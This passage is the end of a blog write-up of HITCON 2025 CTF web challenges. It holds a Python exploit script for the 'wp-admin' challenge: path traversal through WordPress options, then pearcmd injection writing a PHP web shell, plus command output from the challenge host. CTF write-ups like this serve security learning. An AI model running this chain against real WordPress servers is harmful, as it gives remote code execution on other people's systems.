ids.append(post_id)</span><br><span class="line">        <span class="comment"># get their corresponding pear_id and shell_id</span></span><br><span class="line">        pear_id, shell_id = ids</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pear_id = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_id = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now go to the options page</span></span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-admin/options.php&quot;</span>)</span><br><span class="line">        <span class="comment"># check if we have the right options</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;../&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="keyword">await</span> page.locator(<span class="string">&#x27;input[name=&quot;stylesheet&quot;]&#x27;</span>).input_value():</span><br><span class="line">            <span class="comment"># set stylesheet to tmp and upload path to /tmp/single-post-</span></span><br><span class="line">            <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;stylesheet&quot;]&#x27;</span>, <span class="string">&quot;../../../../../../../../tmp/&quot;</span>)</span><br><span class="line">            <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;upload_path&quot;]&#x27;</span>, <span class="string">&quot;/tmp/single-post-&quot;</span>)</span><br><span class="line">            <span class="keyword">await</span> page.click(<span class="string">&#x27;input[type=submit][value=&quot;Save Changes&quot;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># then upload a dummy file to ensure /tmp/single-post- folder is created</span></span><br><span class="line">            <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-admin/media-new.php?browser-uploader&quot;</span>)</span><br><span class="line">            upl = page.locator(<span class="string">&quot;#async-upload&quot;</span>)</span><br><span class="line">            <span class="keyword">await</span> upl.set_input_files(</span><br><span class="line">                [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test.txt&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;mimeType&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;buffer&quot;</span>: <span class="string">b&quot;kon peko&quot;</span>,</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">await</span> page.click(<span class="string">&#x27;input[type=submit][value=&quot;Upload&quot;]&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now we can use the pearcmd to write /tmp/shell.php</span></span><br><span class="line">        p1 = <span class="keyword">await</span> asyncio.create_subprocess_exec(</span><br><span class="line">            <span class="string">&quot;curl&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--&quot;</span>,</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/?p=<span class="subst">&#123;pear_id&#125;</span>&amp;+config-create+/&lt;?system($_GET[0]);die();?&gt;+/tmp/shell.php&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> p1.wait()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># execute the command</span></span><br><span class="line">        p2 = <span class="keyword">await</span> asyncio.create_subprocess_exec(</span><br><span class="line">            <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/?p=<span class="subst">&#123;shell_id&#125;</span>&amp;0=<span class="subst">&#123;quote_plus(cmd)&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> p2.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://localhost:8000&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span> <span class="keyword">else</span> sys.argv[<span class="number">1</span>].rstrip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">asyncio.run(main(target, <span class="string">&quot;id &amp;&amp; ls -l / &amp;&amp; /readflag&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&gt; python exp.py</span><br><span class="line">pear_id = 8</span><br><span class="line">shell_id = 1</span><br><span class="line">CONFIGURATION (CHANNEL PEAR.PHP.NET):</span><br><span class="line">=====================================</span><br><span class="line">Auto-discover new Channels     auto_discover    &lt;not set&gt;</span><br><span class="line">Default Channel                default_channel  pear.php.net</span><br><span class="line">HTTP Proxy Server Address      http_proxy       &lt;not set&gt;</span><br><span class="line">PEAR server [DEPRECATED]       master_server    &lt;not set&gt;</span><br><span class="line">Default Channel Mirror         preferred_mirror &lt;not set&gt;</span><br><span class="line">Remote Configuration File      remote_config    &lt;not set&gt;</span><br><span class="line">PEAR executables directory     bin_dir          /&lt;?system($_GET[0]);die();?&gt;/pear</span><br><span class="line">PEAR documentation directory   doc_dir          /&lt;?system($_GET[0]);die();?&gt;/pear/docs</span><br><span class="line">PHP extension directory        ext_dir          /&lt;?system($_GET[0]);die();?&gt;/pear/ext</span><br><span class="line">PEAR directory                 php_dir          /&lt;?system($_GET[0]);die();?&gt;/pear/php</span><br><span class="line">PEAR Installer cache directory cache_dir        /&lt;?system($_GET[0]);die();?&gt;/pear/cache</span><br><span class="line">PEAR configuration file        cfg_dir          /&lt;?system($_GET[0]);die();?&gt;/pear/cfg</span><br><span class="line">directory</span><br><span class="line">PEAR data directory            data_dir         /&lt;?system($_GET[0]);die();?&gt;/pear/data</span><br><span class="line">PEAR Installer download        download_dir     /&lt;?system($_GET[0]);die();?&gt;/pear/download</span><br><span class="line">directory</span><br><span class="line">Systems manpage files          man_dir          /&lt;?system($_GET[0]);die();?&gt;/pear/man</span><br><span class="line">directory</span><br><span class="line">PEAR metadata directory        metadata_dir     &lt;not set&gt;</span><br><span class="line">PHP CLI/CGI binary             php_bin          &lt;not set&gt;</span><br><span class="line">php.ini location               php_ini          &lt;not set&gt;</span><br><span class="line">--program-prefix passed to     php_prefix       &lt;not set&gt;</span><br><span class="line">PHP&#x27;s ./configure</span><br><span class="line">--program-suffix passed to     php_suffix       &lt;not set&gt;</span><br><span class="line">PHP&#x27;s ./configure</span><br><span class="line">PEAR Installer temp directory  temp_dir         /&lt;?system($_GET[0]);die();?&gt;/pear/temp</span><br><span class="line">PEAR test directory            test_dir         /&lt;?system($_GET[0]);die();?&gt;/pear/tests</span><br><span class="line">PEAR www files directory       www_dir          /&lt;?system($_GET[0]);die();?&gt;/pear/www</span><br><span class="line">Cache TimeToLive               cache_ttl        &lt;not set&gt;</span><br><span class="line">Preferred Package State        preferred_state  &lt;not set&gt;</span><br><span class="line">Unix file mask                 umask            &lt;not set&gt;</span><br><span class="line">Debug Log Level                verbose          &lt;not set&gt;</span><br><span class="line">PEAR password (for             password         &lt;not set&gt;</span><br><span class="line">maintainers)</span><br><span class="line">Signature Handling Program     sig_bin          &lt;not set&gt;</span><br><span class="line">Signature Key Directory        sig_keydir       &lt;not set&gt;</span><br><span class="line">Signature Key Id               sig_keyid        &lt;not set&gt;</span><br><span class="line">Package Signature Type         sig_type         &lt;not set&gt;</span><br><span class="line">PEAR username (for             username         &lt;not set&gt;</span><br><span class="line">maintainers)</span><br><span class="line">User Configuration File        Filename         /tmp/shell.php</span><br><span class="line">System Configuration File      Filename         #no#system#config#</span><br><span class="line">Successfully created default configuration file &quot;/tmp/shell.php&quot;</span><br><span class="line">#PEAR_Config 0.9</span><br><span class="line">a:12:&#123;s:7:&quot;php_dir&quot;;s:37:&quot;/uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">total 56</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 12 19:25 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 12 19:25 boot</span><br><span class="line">drwxr-xr-x   5 root root  340 Aug 27 14:51 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 26 18:39 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 12 19:25 home</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 12 19:25 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx   1 root root    9 May 12 19:25 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Aug 11 00:00 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Aug 11 00:00 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Aug 11 00:00 opt</span><br><span class="line">dr-xr-xr-x 368 root root    0 Aug 27 14:51 proc</span><br><span class="line">---x--x--x   1 root root  161 Aug 22 17:52 readflag</span><br><span class="line">drwx------   2 root root 4096 Aug 11 00:00 root</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 12 22:27 run</span><br><span class="line">lrwxrwxrwx   1 root root    8 May 12 19:25 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Aug 11 00:00 srv</span><br><span class="line">dr-xr-xr-x  11 root root    0 Aug 27 14:51 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Aug 27 19:03 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 11 00:00 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 12 22:26 var</span><br><span class="line">flag&#123;test_flag&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/08/24/HITCON-2025/">https://sakuraraindrop.github.io/2025/08/24/HITCON-2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pyjail/">pyjail</a><a class="post-meta__tags" href="/tags/os-path-join/">os.path.join</a><a class="post-meta__tags" href="/tags/git%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">git命令执行</a><a class="post-meta__tags" href="/tags/verilog%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">verilog命令执行</a><a class="post-meta__tags" href="/tags/slim%E6%A8%A1%E6%9D%BF/">slim模板</a><a class="post-meta__tags" href="/tags/tcp%E8%87%AA%E8%BF%9E%E6%8E%A5/">tcp自连接</a><a class="post-meta__tags" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-with-image/">pickle反序列化(with image)</a><a class="post-meta__tags" href="/tags/multiprocessing%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E7%AE%A1%E9%81%93%E6%B1%A1%E6%9F%93/">multiprocessing进程间通信管道污染</a><a class="post-meta__tags" href="/tags/sqlite/">sqlite</a><a class="post-meta__tags" href="/tags/php-jail/">php jail</a><a class="post-meta__tags" href="/tags/laravel/">laravel</a><a class="post-meta__tags" href="/tags/wordpress/">wordpress</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/08/17/sekaiCTF-2025/" title="sekaiCTF-2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">sekaiCTF-2025</div></div></div></a><a class="pagination-related  no-desc" href="/2025/08/29/TFCCTF-2025/" title="TFCCTF-2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">TFCCTF-2025</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/07/08/20250708%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250708随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">20250708随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250711随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-11</div><div class="info-item-2">20250711随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/13/20250713%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250713随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-13</div><div class="info-item-2">20250713随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/08/29/TFCCTF-2025/" title="TFCCTF-2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-29</div><div class="info-item-2">TFCCTF-2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/07/pyjail%20problems/" title="pyjail problems"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-07</div><div class="info-item-2">pyjail problems</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#git-playground"><span class="toc-number">1.</span> <span class="toc-text">git-playground</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-drive"><span class="toc-number">2.</span> <span class="toc-text">simple-drive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Verilog-OJ"><span class="toc-number">3.</span> <span class="toc-text">Verilog OJ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-Man%E2%80%99s-Echo"><span class="toc-number">4.</span> <span class="toc-text">No Man’s Echo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IMGC0NV"><span class="toc-number">5.</span> <span class="toc-text">IMGC0NV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pholyglot"><span class="toc-number">6.</span> <span class="toc-text">Pholyglot!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Note"><span class="toc-number">7.</span> <span class="toc-text">Note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simp"><span class="toc-number">8.</span> <span class="toc-text">simp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp-admin"><span class="toc-number">9.</span> <span class="toc-text">wp-admin</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/17/reverse-learning/" title="reverse-learning">reverse-learning</a><time datetime="2025-10-17T04:52:59.000Z" title="发表于 2025-10-17 12:52:59">2025-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/hackasat-2020-quals/" title="hackasat-2020-quals">hackasat-2020-quals</a><time datetime="2025-10-09T06:51:05.000Z" title="发表于 2025-10-09 14:51:05">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/02/20251002%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/" title="20251002论文精读">20251002论文精读</a><time datetime="2025-10-02T09:04:55.000Z" title="发表于 2025-10-02 17:04:55">2025-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/30/hackasat-2022-quals/" title="hackasat-2022-quals">hackasat-2022-quals</a><time datetime="2025-09-30T12:06:48.000Z" title="发表于 2025-09-30 20:06:48">2025-09-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/20250927%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250927随缘刷题">20250927随缘刷题</a><time datetime="2025-09-27T04:45:15.000Z" title="发表于 2025-09-27 12:45:15">2025-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>